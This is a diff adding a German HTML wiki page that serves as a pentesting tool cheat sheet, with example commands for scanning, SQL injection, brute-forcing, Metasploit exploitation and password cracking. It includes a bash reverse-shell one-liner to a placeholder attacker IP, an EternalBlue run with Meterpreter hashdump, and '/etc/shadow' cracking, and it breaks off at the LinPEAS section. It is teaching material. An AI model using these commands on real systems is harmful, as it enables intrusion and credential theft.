@@ -1,0 +1,731 @@
+<!-- This file has been moved to /home/aimon/Documents/code/wiki.simonwied.com/cybertools/cybertools.html -->
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberTools – wiki.simonwied.com</title>
+<!-- Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G07DY445N4"></script>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../style.css?v=1.5.2">
+<script src="../../version.js?v=1.5.2"></script>
+<script src="cybertools.js?v=1.5.2" defer></script>
+<link rel="icon" type="image/svg+xml" href="../../assets/favicon.svg">
+<link rel="icon" type="image/png" sizes="96x96" href="../../assets/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="192x192" href="../../assets/web-app-manifest-192x192.png">
+<link rel="icon" type="image/png" sizes="512x512" href="../../assets/web-app-manifest-512x512.png">
+<link rel="shortcut icon" href="../../assets/favicon.ico">
+<link rel="apple-touch-icon" sizes="180x180" href="../../assets/apple-touch-icon.png">
+<link rel="manifest" href="../../assets/site.webmanifest">
+</head>
+<body>
+
+<div class="layout">
+  <nav class="sidebar" id="sidebar">
+    <button class="sidebar-toggle" id="sidebarToggle">«</button>
+    <div class="sidebar-logo">
+      <a href="../../index.html"><img src="../../assets/logo_big.png" alt="Wiki." class="logo-img"></a>
+    </div>
+
+    <div class="nav-section">
+      <div class="nav-section-title">Wiki</div>
+      <a href="../../index.html" class="nav-item">
+        <div class="dot" style="background:var(--accent)"></div> ← Startseite
+      </a>
+    </div>
+
+    <div class="nav-section" style="margin-top:4px">
+      <div class="nav-section-title">Kategorien</div>
+      <a href="#recon" class="nav-item">
+        <div class="dot" style="background:#44ffcc"></div> Recon & Scanning
+      </a>
+      <a href="#web" class="nav-item">
+        <div class="dot" style="background:#4488ff"></div> Web Security
+      </a>
+      <a href="#network" class="nav-item">
+        <div class="dot" style="background:#ffaa00"></div> Netzwerk
+      </a>
+      <a href="#exploit" class="nav-item">
+        <div class="dot" style="background:#ff4466"></div> Exploitation
+      </a>
+      <a href="#passwords" class="nav-item">
+        <div class="dot" style="background:#aa44ff"></div> Passwörter
+      </a>
+      <a href="#postexploit" class="nav-item">
+        <div class="dot" style="background:#ccff44"></div> Post-Exploitation
+      </a>
+    </div>
+
+    <div class="sidebar-bottom">
+      <div class="logo-text">wiki.simonwied.com</div>
+    </div>
+  </nav>
+  <div class="sidebar-resize" id="sidebarResize"></div>
+
+  <main class="main">
+    <div class="breadcrumb">
+      <a href="../../index.html" class="breadcrumb-link">wiki.simonwied.com</a>
+      <span class="breadcrumb-sep">/</span>
+      <span class="breadcrumb-current">CyberTools</span>
+    </div>
+
+    <div class="page-header" id="intro">
+      <span class="page-emoji">🧰</span>
+      <h1 class="page-title">CyberTools</h1>
+      <p class="page-subtitle">
+        Die wichtigsten Tools der Cybersecurity — mit Erklärung, Flags und Beispielen.<br>
+        Kategorisiert nach Einsatzgebiet.
+      </p>
+      <div class="page-meta">
+        <span class="tag">Referenz</span>
+        <span class="tag">Kali Linux</span>
+        <span class="tag">Ethical Hacking</span>
+      </div>
+    </div>
+
+    <div class="callout">
+      <span class="callout-icon">⚠️</span>
+      <div>Nur auf eigenen Systemen oder mit ausdrücklicher Genehmigung einsetzen. Unbefugter Einsatz ist strafbar.</div>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- ══════════════════════════════════════════
+         1. RECON & SCANNING
+    ══════════════════════════════════════════ -->
+    <div class="category" id="recon">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(68,255,204,0.12);color:#44ffcc;border:1px solid rgba(68,255,204,0.3)">🔍 Recon</span>
+        <h2 class="cat-title">Reconnaissance & Scanning</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Nmap -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,255,204,0.08)">🗺️</div>
+          <span class="sub-title">Nmap — Network Mapper</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-medium">● RECON</span>
+          <p class="sub-desc">
+            Der Standard-Port-Scanner. Findet offene Ports, erkennt laufende Dienste und deren Versionen, erkennt das Betriebssystem. Unverzichtbar am Anfang jedes Pentests.
+          </p>
+          <pre><span class="hl-comment"># Schneller Scan der häufigsten 1000 Ports</span>
+<span class="hl-func">nmap</span> <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># Alle 65535 Ports scannen</span>
+<span class="hl-func">nmap</span> -p- <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># Service-Version + OS-Detection + Scripts (Standard-Combo)</span>
+<span class="hl-func">nmap</span> -sV -sC -O <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># Aggressiver Scan (alles auf einmal)</span>
+<span class="hl-func">nmap</span> -A -p- <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># Schnell + alle Ports (für CTFs)</span>
+<span class="hl-func">nmap</span> -sV -sC -p- --min-rate <span class="hl-num">5000</span> <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># UDP-Scan (langsamer, aber wichtig)</span>
+<span class="hl-func">nmap</span> -sU --top-ports <span class="hl-num">20</span> <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># Ergebnis in Datei speichern</span>
+<span class="hl-func">nmap</span> -sV -oN scan.txt <span class="hl-var">10.10.10.1</span></pre>
+          <table class="info-table">
+            <tr><th>Flag</th><th>Bedeutung</th></tr>
+            <tr><td>-sV</td><td>Service-Versionen erkennen</td></tr>
+            <tr><td>-sC</td><td>Standard-Scripts ausführen</td></tr>
+            <tr><td>-O</td><td>Betriebssystem erkennen</td></tr>
+            <tr><td>-A</td><td>Alles: -sV -sC -O + Traceroute</td></tr>
+            <tr><td>-p-</td><td>Alle 65535 Ports scannen</td></tr>
+            <tr><td>-sU</td><td>UDP-Scan</td></tr>
+            <tr><td>-oN</td><td>Output als Textdatei speichern</td></tr>
+            <tr><td>--min-rate</td><td>Mindest-Paketrate (schneller Scan)</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- Gobuster -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,255,204,0.08)">📂</div>
+          <span class="sub-title">Gobuster — Directory & DNS Bruteforcer</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-medium">● RECON</span>
+          <p class="sub-desc">
+            Findet versteckte Verzeichnisse, Dateien und Subdomains per Wordlist-Brute-Force. Schneller und effizienter als manuelles Durchsuchen.
+          </p>
+          <pre><span class="hl-comment"># Directory-Scan (häufigste Nutzung)</span>
+<span class="hl-func">gobuster</span> dir -u <span class="hl-str">https://example.com</span> \
+  -w /usr/share/wordlists/dirb/common.txt
+
+<span class="hl-comment"># Mit Dateiendungen suchen (.php, .html, .txt)</span>
+<span class="hl-func">gobuster</span> dir -u <span class="hl-str">https://example.com</span> \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,html,txt,bak
+
+<span class="hl-comment"># Subdomain-Enumeration</span>
+<span class="hl-func">gobuster</span> dns -d <span class="hl-str">example.com</span> \
+  -w /usr/share/wordlists/subdomains.txt
+
+<span class="hl-comment"># Mit Auth-Header (für geschützte Bereiche)</span>
+<span class="hl-func">gobuster</span> dir -u <span class="hl-str">https://example.com</span> \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -H <span class="hl-str">"Authorization: Bearer TOKEN"</span>
+
+<span class="hl-comment"># Schnellere Wordlist für CTFs:</span>
+<span class="hl-comment"># /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></pre>
+          <div class="defense-block">
+            <h4>📝 Nützliche Wordlists</h4>
+            <ul>
+              <li>/usr/share/wordlists/dirb/common.txt — schnell, für den Anfang</li>
+              <li>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt — umfassend</li>
+              <li>SecLists (GitHub) — beste Sammlung überhaupt</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- ffuf -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,255,204,0.08)">⚡</div>
+          <span class="sub-title">ffuf — Fast Web Fuzzer</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-medium">● RECON</span>
+          <p class="sub-desc">
+            Schnellster Web-Fuzzer. Kann Directories, Parameter, Header, Subdomains und vieles mehr fuzzen. Das FUZZ-Keyword wird durch Wordlist-Einträge ersetzt.
+          </p>
+          <pre><span class="hl-comment"># Directory Fuzzing</span>
+<span class="hl-func">ffuf</span> -w /usr/share/wordlists/dirb/common.txt \
+  -u https://example.com/<span class="hl-var">FUZZ</span>
+
+<span class="hl-comment"># Nur bestimmte HTTP-Codes anzeigen</span>
+<span class="hl-func">ffuf</span> -w wordlist.txt -u https://example.com/<span class="hl-var">FUZZ</span> -mc 200,301,302
+
+<span class="hl-comment"># Parameter Fuzzing (GET)</span>
+<span class="hl-func">ffuf</span> -w wordlist.txt \
+  -u "https://example.com/page?<span class="hl-var">FUZZ</span>=value" -mc 200
+
+<span class="hl-comment"># Subdomains fuzzen</span>
+<span class="hl-func">ffuf</span> -w subdomains.txt \
+  -u https://<span class="hl-var">FUZZ</span>.example.com -mc 200
+
+<span class="hl-comment"># Ergebnisse nach Größe filtern (false positives ausblenden)</span>
+<span class="hl-func">ffuf</span> -w wordlist.txt -u https://example.com/<span class="hl-var">FUZZ</span> -fs 1234</pre>
+        </div>
+      </div>
+
+      <!-- Nikto -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,255,204,0.08)">🔬</div>
+          <span class="sub-title">Nikto — Web Vulnerability Scanner</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-medium">● SCAN</span>
+          <p class="sub-desc">
+            Automatischer Web-Server-Scanner. Prüft auf bekannte Schwachstellen, unsichere Konfigurationen, veraltete Software und gefährliche Dateien. Laut, aber umfassend.
+          </p>
+          <pre><span class="hl-comment"># Standard-Scan</span>
+<span class="hl-func">nikto</span> -h https://example.com
+
+<span class="hl-comment"># Über Burp Suite proxyen (um Traffic zu sehen)</span>
+<span class="hl-func">nikto</span> -h https://example.com \
+  -useproxy http://127.0.0.1:8080
+
+<span class="hl-comment"># Output in Datei speichern</span>
+<span class="hl-func">nikto</span> -h https://example.com -o nikto_report.txt</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         2. WEB SECURITY
+    ══════════════════════════════════════════ -->
+    <div class="category" id="web">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(68,136,255,0.12);color:#4488ff;border:1px solid rgba(68,136,255,0.3)">🌐 Web</span>
+        <h2 class="cat-title">Web Security Tools</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Burp Suite -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,136,255,0.1)">🔀</div>
+          <span class="sub-title">Burp Suite — Web Application Proxy</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● ESSENTIELL</span>
+          <p class="sub-desc">
+            Das wichtigste Tool für Web-Pentesting. Sitzt als Proxy zwischen Browser und Server, fängt alle HTTP-Requests ab und ermöglicht das Modifizieren, Wiederholen und automatische Testen von Anfragen. Community Edition ist kostenlos.
+          </p>
+          <div class="how-it-works">
+            <h4>Wichtigste Module</h4>
+            <div class="steps">
+              <div class="step"><span class="step-num">Proxy</span><span>HTTP-Traffic abfangen und modifizieren — Hauptarbeitsbereich</span></div>
+              <div class="step"><span class="step-num">Repeater</span><span>Einzelne Requests beliebig oft wiederholen und anpassen</span></div>
+              <div class="step"><span class="step-num">Intruder</span><span>Automatisierter Angriff mit Payloads (Bruteforce, Fuzzing)</span></div>
+              <div class="step"><span class="step-num">Decoder</span><span>Base64, URL-Encoding, HTML, SHA etc. en-/decodieren</span></div>
+              <div class="step"><span class="step-num">Scanner</span><span>Automatische Schwachstellensuche (nur Pro-Version)</span></div>
+            </div>
+          </div>
+          <pre><span class="hl-comment"># Burp Suite starten (Kali)</span>
+<span class="hl-func">burpsuite</span>
+
+<span class="hl-comment"># Proxy läuft standardmäßig auf:</span>
+<span class="hl-good">127.0.0.1:8080</span>
+
+<span class="hl-comment"># Browser-Proxy einstellen (Firefox):</span>
+<span class="hl-comment"># Einstellungen → Netzwerk → Proxy → Manuell</span>
+<span class="hl-comment"># HTTP-Proxy: 127.0.0.1  Port: 8080</span>
+
+<span class="hl-comment"># Burp CA-Zertifikat installieren (für HTTPS):</span>
+<span class="hl-comment"># http://burp → CA Certificate herunterladen</span>
+<span class="hl-comment"># Firefox: Einstellungen → Zertifikate → Importieren</span>
+
+<span class="hl-comment"># Request an Repeater senden</span>
+<span class="hl-good">Strg+R</span>
+
+<span class="hl-comment"># Request an Intruder senden</span>
+<span class="hl-good">Strg+I</span>
+
+<span class="hl-comment"># URL-encode/decode</span>
+<span class="hl-good">Strg+U</span></pre>
+          <div class="defense-block">
+            <h4>📝 Workflow</h4>
+            <ul>
+              <li>Proxy aktivieren → Seite im Browser aufrufen → Traffic in Proxy-History analysieren</li>
+              <li>Interessanten Request → Rechtsklick → "Send to Repeater" → modifizieren & senden</li>
+              <li>FoxyProxy (Firefox-Extension) empfohlen für schnelles Proxy-Umschalten</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- sqlmap -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,170,0,0.1)">💉</div>
+          <span class="sub-title">sqlmap — SQL Injection Automation</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● EXPLOIT</span>
+          <p class="sub-desc">
+            Automatisierte Erkennung und Ausnutzung von SQL-Injection-Schwachstellen. Kann Datenbanken auslesen, Tabellen dumpen und in manchen Fällen sogar Shell-Zugriff erlangen.
+          </p>
+          <pre><span class="hl-comment"># URL auf SQLi testen</span>
+<span class="hl-func">sqlmap</span> -u <span class="hl-str">"https://example.com/item?id=1"</span>
+
+<span class="hl-comment"># Alle Datenbanken auflisten</span>
+<span class="hl-func">sqlmap</span> -u <span class="hl-str">"https://example.com/item?id=1"</span> --dbs
+
+<span class="hl-comment"># Tabellen einer Datenbank auflisten</span>
+<span class="hl-func">sqlmap</span> -u <span class="hl-str">"https://example.com/item?id=1"</span> \
+  -D <span class="hl-str">datenbankname</span> --tables
+
+<span class="hl-comment"># Tabelle dumpen (alle Daten)</span>
+<span class="hl-func">sqlmap</span> -u <span class="hl-str">"https://example.com/item?id=1"</span> \
+  -D <span class="hl-str">datenbankname</span> -T <span class="hl-str">users</span> --dump
+
+<span class="hl-comment"># POST-Request aus Burp Suite verwenden</span>
+<span class="hl-func">sqlmap</span> -r request.txt -p <span class="hl-str">username</span> --dbs
+
+<span class="hl-comment"># Aggressiv + alle Techniken testen</span>
+<span class="hl-func">sqlmap</span> -u <span class="hl-str">"https://example.com/item?id=1"</span> --level=5 --risk=3</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         3. NETZWERK TOOLS
+    ══════════════════════════════════════════ -->
+    <div class="category" id="network">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(255,170,0,0.12);color:#ffaa00;border:1px solid rgba(255,170,0,0.3)">📡 Netzwerk</span>
+        <h2 class="cat-title">Netzwerk Tools</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Ncat / Netcat -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,170,0,0.1)">🔌</div>
+          <span class="sub-title">Ncat / Netcat — Netzwerk-Schweizer-Messer</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● ESSENTIELL</span>
+          <p class="sub-desc">
+            Ncat (Nmap-Version von Netcat) liest und schreibt Daten über TCP/UDP-Verbindungen. Wird für Reverse Shells, Bind Shells, Port-Listening und Dateiübertragungen verwendet. Unersetzlich.
+          </p>
+          <pre><span class="hl-comment"># Listener starten (auf eingehende Verbindung warten)</span>
+<span class="hl-func">ncat</span> -lvnp <span class="hl-num">4444</span>
+
+<span class="hl-comment"># Alternativ mit klassischem netcat</span>
+<span class="hl-func">nc</span> -lvnp <span class="hl-num">4444</span>
+
+<span class="hl-comment"># Verbindung zu einem Host aufbauen</span>
+<span class="hl-func">ncat</span> <span class="hl-var">10.10.10.1</span> <span class="hl-num">4444</span>
+
+<span class="hl-comment"># Reverse Shell empfangen (auf Angreifer-Maschine):</span>
+<span class="hl-func">ncat</span> -lvnp <span class="hl-num">4444</span>
+
+<span class="hl-comment"># Reverse Shell senden (auf Opfer-Maschine, bash):</span>
+<span class="hl-danger">bash -i &gt;&amp; /dev/tcp/ANGREIFER-IP/4444 0&gt;&amp;1</span>
+
+<span class="hl-comment"># Datei übertragen (Empfänger):</span>
+<span class="hl-func">ncat</span> -lvnp <span class="hl-num">9999</span> > empfangene_datei.txt
+
+<span class="hl-comment"># Datei übertragen (Sender):</span>
+<span class="hl-func">ncat</span> <span class="hl-var">10.10.10.1</span> <span class="hl-num">9999</span> &lt; datei.txt
+
+<span class="hl-comment"># Port-Check (ist Port offen?)</span>
+<span class="hl-func">ncat</span> -zv <span class="hl-var">10.10.10.1</span> <span class="hl-num">80</span></pre>
+          <table class="info-table">
+            <tr><th>Flag</th><th>Bedeutung</th></tr>
+            <tr><td>-l</td><td>Listen-Mode (auf Verbindung warten)</td></tr>
+            <tr><td>-v</td><td>Verbose (mehr Output)</td></tr>
+            <tr><td>-n</td><td>Kein DNS-Lookup</td></tr>
+            <tr><td>-p</td><td>Port angeben</td></tr>
+            <tr><td>-e</td><td>Programm nach Verbindung ausführen (Bind Shell)</td></tr>
+            <tr><td>-z</td><td>Zero-I/O mode (Port-Check)</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- Wireshark -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,136,255,0.1)">🦈</div>
+          <span class="sub-title">Wireshark — Netzwerk-Traffic Analyse</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-medium">● ANALYSE</span>
+          <p class="sub-desc">
+            Grafischer Netzwerk-Sniffer. Zeichnet Netzwerkpakete live auf und analysiert sie. Unverzichtbar für Traffic-Analyse, Protokoll-Debugging und das Finden von Credentials in unverschlüsseltem Traffic.
+          </p>
+          <pre><span class="hl-comment"># Nur HTTP-Traffic anzeigen</span>
+<span class="hl-func">http</span>
+
+<span class="hl-comment"># Traffic zu/von bestimmter IP</span>
+<span class="hl-func">ip.addr</span> == <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># Nur TCP-Traffic auf Port 80</span>
+<span class="hl-func">tcp.port</span> == <span class="hl-num">80</span>
+
+<span class="hl-comment"># POST-Requests filtern (enthält oft Credentials)</span>
+<span class="hl-func">http.request.method</span> == <span class="hl-str">"POST"</span>
+
+<span class="hl-comment"># Passwörter in FTP/Telnet suchen</span>
+<span class="hl-func">ftp</span>
+<span class="hl-func">telnet</span>
+
+<span class="hl-comment"># Follow TCP Stream (kompletten Datenaustausch lesen)</span>
+<span class="hl-comment"># Rechtsklick auf Paket → Follow → TCP Stream</span>
+
+<span class="hl-comment"># Alternativ: tcpdump (CLI-Version)</span>
+<span class="hl-func">tcpdump</span> -i eth0 -w capture.pcap
+<span class="hl-func">tcpdump</span> -r capture.pcap port <span class="hl-num">80</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         4. EXPLOITATION
+    ══════════════════════════════════════════ -->
+    <div class="category" id="exploit">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(255,68,102,0.12);color:#ff4466;border:1px solid rgba(255,68,102,0.3)">💥 Exploit</span>
+        <h2 class="cat-title">Exploitation Tools</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Hydra -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,68,102,0.1)">🔨</div>
+          <span class="sub-title">Hydra — Online Brute Forcer</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Schneller, parallelisierter Login-Bruteforcer. Unterstützt über 50 Protokolle: HTTP, SSH, FTP, SMB, RDP, MySQL, SMTP und mehr. Standard-Tool für Credential-Angriffe.
+          </p>
+          <pre><span class="hl-comment"># SSH Bruteforce</span>
+<span class="hl-func">hydra</span> -l <span class="hl-str">admin</span> -P /usr/share/wordlists/rockyou.txt \
+  <span class="hl-var">10.10.10.1</span> ssh
+
+<span class="hl-comment"># HTTP POST Login Formular</span>
+<span class="hl-func">hydra</span> -l <span class="hl-str">admin</span> -P /usr/share/wordlists/rockyou.txt \
+  <span class="hl-var">example.com</span> http-post-form \
+  <span class="hl-str">"/login:username=^USER^&password=^PASS^:Invalid credentials"</span>
+
+<span class="hl-comment"># FTP Bruteforce</span>
+<span class="hl-func">hydra</span> -l <span class="hl-str">admin</span> -P /usr/share/wordlists/rockyou.txt \
+  <span class="hl-var">10.10.10.1</span> ftp
+
+<span class="hl-comment"># Mehrere Benutzernamen aus Datei</span>
+<span class="hl-func">hydra</span> -L users.txt -P passwords.txt <span class="hl-var">10.10.10.1</span> ssh
+
+<span class="hl-comment"># Schneller mit mehr Threads</span>
+<span class="hl-func">hydra</span> -l <span class="hl-str">admin</span> -P rockyou.txt -t <span class="hl-num">64</span> <span class="hl-var">10.10.10.1</span> ssh</pre>
+          <table class="info-table">
+            <tr><th>Flag</th><th>Bedeutung</th></tr>
+            <tr><td>-l</td><td>Einzelner Benutzername</td></tr>
+            <tr><td>-L</td><td>Benutzernamen aus Datei</td></tr>
+            <tr><td>-p</td><td>Einzelnes Passwort</td></tr>
+            <tr><td>-P</td><td>Passwörter aus Datei (Wordlist)</td></tr>
+            <tr><td>-t</td><td>Anzahl paralleler Verbindungen (Standard: 16)</td></tr>
+            <tr><td>-s</td><td>Anderen Port angeben</td></tr>
+            <tr><td>-V</td><td>Jeden Versuch anzeigen</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- Metasploit -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,68,102,0.1)">🎯</div>
+          <span class="sub-title">Metasploit Framework — Exploitation Framework</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-critical">● CRITICAL POWER</span>
+          <p class="sub-desc">
+            Das bekannteste Exploitation-Framework. Enthält tausende fertige Exploits, Payloads und Post-Exploitation-Module. Für CVE-basierte Angriffe, Shellcode-Generierung und Meterpreter-Sessions.
+          </p>
+          <pre><span class="hl-comment"># Metasploit starten</span>
+<span class="hl-func">msfconsole</span>
+
+<span class="hl-comment"># Nach Exploit suchen</span>
+msf6> <span class="hl-func">search</span> eternalblue
+msf6> <span class="hl-func">search</span> type:exploit platform:windows smb
+
+<span class="hl-comment"># Exploit auswählen</span>
+msf6> <span class="hl-func">use</span> exploit/windows/smb/ms17_010_eternalblue
+
+<span class="hl-comment"># Optionen anzeigen</span>
+msf6> <span class="hl-func">show options</span>
+
+<span class="hl-comment"># Ziel-IP setzen</span>
+msf6> <span class="hl-func">set</span> RHOSTS <span class="hl-var">10.10.10.1</span>
+
+<span class="hl-comment"># Eigene IP setzen (für Reverse Shell)</span>
+msf6> <span class="hl-func">set</span> LHOST <span class="hl-var">10.10.10.99</span>
+
+<span class="hl-comment"># Payload wählen (Meterpreter empfohlen)</span>
+msf6> <span class="hl-func">set</span> payload windows/x64/meterpreter/reverse_tcp
+
+<span class="hl-comment"># Ausführen</span>
+msf6> <span class="hl-func">run</span>
+
+<span class="hl-comment"># System-Info anzeigen</span>
+meterpreter> <span class="hl-func">sysinfo</span>
+
+<span class="hl-comment"># Aktuellen User anzeigen</span>
+meterpreter> <span class="hl-func">getuid</span>
+
+<span class="hl-comment"># OS-Shell öffnen</span>
+meterpreter> <span class="hl-func">shell</span>
+
+<span class="hl-comment"># Windows-Passwort-Hashes dumpen</span>
+meterpreter> <span class="hl-func">hashdump</span>
+
+<span class="hl-comment"># Datei herunterladen</span>
+meterpreter> <span class="hl-func">download</span> datei.txt</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         5. PASSWÖRTER
+    ══════════════════════════════════════════ -->
+    <div class="category" id="passwords">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(170,68,255,0.12);color:#aa44ff;border:1px solid rgba(170,68,255,0.3)">🔑 Passwörter</span>
+        <h2 class="cat-title">Password Cracking</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Hashcat -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(170,68,255,0.1)">🔓</div>
+          <span class="sub-title">Hashcat — GPU-basierter Hash Cracker</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Schnellster Passwort-Cracker der Welt — nutzt GPU-Beschleunigung. Unterstützt über 300 Hash-Typen (MD5, SHA1, bcrypt, NTLM, ...). Unverzichtbar wenn man Hash-Dumps aus einer Datenbank hat.
+          </p>
+          <pre><span class="hl-comment"># MD5-Hash cracken (Wordlist-Angriff)</span>
+<span class="hl-func">hashcat</span> -m <span class="hl-num">0</span> -a <span class="hl-num">0</span> hash.txt /usr/share/wordlists/rockyou.txt
+
+<span class="hl-comment"># SHA1-Hash</span>
+<span class="hl-func">hashcat</span> -m <span class="hl-num">100</span> -a <span class="hl-num">0</span> hash.txt rockyou.txt
+
+<span class="hl-comment"># NTLM (Windows)</span>
+<span class="hl-func">hashcat</span> -m <span class="hl-num">1000</span> -a <span class="hl-num">0</span> hash.txt rockyou.txt
+
+<span class="hl-comment"># bcrypt (langsam, aber möglich)</span>
+<span class="hl-func">hashcat</span> -m <span class="hl-num">3200</span> -a <span class="hl-num">0</span> hash.txt rockyou.txt
+
+<span class="hl-comment"># Mit Regeln (Passwörter mutieren: password → P@ssw0rd)</span>
+<span class="hl-func">hashcat</span> -m <span class="hl-num">0</span> -a <span class="hl-num">0</span> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+<span class="hl-comment"># Hash-Typ identifizieren (vorher)</span>
+<span class="hl-func">hashid</span> <span class="hl-str">'5f4dcc3b5aa765d61d8327deb882cf99'</span>
+<span class="hl-good">→ MD5</span></pre>
+          <table class="info-table">
+            <tr><th>-m Wert</th><th>Hash-Typ</th></tr>
+            <tr><td>0</td><td>MD5</td></tr>
+            <tr><td>100</td><td>SHA1</td></tr>
+            <tr><td>1400</td><td>SHA256</td></tr>
+            <tr><td>1000</td><td>NTLM (Windows)</td></tr>
+            <tr><td>3200</td><td>bcrypt</td></tr>
+            <tr><td>1800</td><td>sha512crypt (Linux /etc/shadow)</td></tr>
+            <tr><td>22000</td><td>WPA2 (WLAN)</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- John the Ripper -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(170,68,255,0.1)">🗡️</div>
+          <span class="sub-title">John the Ripper — Vielseitiger Hash Cracker</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Klassischer Passwort-Cracker. Erkennt Hash-Typen automatisch, crack /etc/shadow-Dateien und viele andere Formate. Besonders praktisch für Linux-Hashes und ZIP/PDF-Passwörter.
+          </p>
+          <pre><span class="hl-comment"># Einfacher Crack (auto-erkennt Hash-Typ)</span>
+<span class="hl-func">john</span> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+<span class="hl-comment"># /etc/shadow cracken (passwd + shadow kombinieren)</span>
+<span class="hl-func">unshadow</span> /etc/passwd /etc/shadow > combined.txt
+<span class="hl-func">john</span> combined.txt --wordlist=rockyou.txt
+
+<span class="hl-comment"># ZIP-Passwort cracken</span>
+<span class="hl-func">zip2john</span> protected.zip > zip_hash.txt
+<span class="hl-func">john</span> zip_hash.txt --wordlist=rockyou.txt
+
+<span class="hl-comment"># SSH-Key cracken</span>
+<span class="hl-func">ssh2john</span> id_rsa > ssh_hash.txt
+<span class="hl-func">john</span> ssh_hash.txt --wordlist=rockyou.txt
+
+<span class="hl-comment"># Bereits gecrackte Passwörter anzeigen</span>
+<span class="hl-func">john</span> --show hash.txt</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         6. POST-EXPLOITATION
+    ══════════════════════════════════════════ -->
+    <div class="category" id="postexploit">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(204,255,68,0.12);color:#ccff44;border:1px solid rgba(204,255,68,0.3)">🏴 Post-Exploit</span>
+        <h2 class="cat-title">Post-Exploitation</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- LinPEAS / WinPEAS -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(204,255,68,0.08)">🔎</div>
+          <span class="sub-title">LinPEAS / WinPEAS — Privilege Escalation Scanner</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
